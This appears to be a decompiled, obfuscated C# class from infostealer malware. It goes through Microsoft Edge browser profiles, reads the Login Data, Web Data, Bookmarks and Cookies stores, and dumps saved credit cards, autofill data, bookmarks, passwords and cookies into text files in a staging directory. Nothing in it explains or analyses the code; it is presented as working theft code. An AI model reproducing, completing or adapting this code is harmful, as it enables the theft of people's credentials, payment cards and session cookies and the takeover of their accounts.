using System.Collections.Generic;
using System.IO;

internal sealed class Class82
{
	public static void smethod_0(string string_0)
	{
		string path = Class52.string_4 + Class52.string_2;
		if (!Directory.Exists(path))
		{
			return;
		}
		string text = string_0 + "\\Edge";
		Directory.CreateDirectory(text);
		string[] directories = Directory.GetDirectories(path);
		foreach (string text2 in directories)
		{
			if (File.Exists(text2 + "\\Login Data"))
			{
				List<Struct1> list_ = Class81.smethod_0(text2 + "\\Web Data");
				List<Struct2> list_2 = Class79.smethod_0(text2 + "\\Web Data");
				List<Struct4> list_3 = Class80.smethod_0(text2 + "\\Bookmarks");
				List<GStruct0> list_4 = Class93.smethod_0(text2 + "\\Login Data");
				List<Struct0> list_5 = Class89.smethod_0(text2 + "\\Cookies");
				Class58.smethod_9(list_, text + "\\CreditCards.txt");
				Class58.smethod_6(list_2, text + "\\AutoFill.txt");
				Class58.smethod_7(list_3, text + "\\Bookmarks.txt");
				Class58.smethod_8(list_4, Class38.string_11 + "\\Passwords.txt");
				Class58.smethod_5(list_5, string_0 + $"\\Cookies_Edge({Class37.smethod_1()}).txt");
			}
		}
	}
}
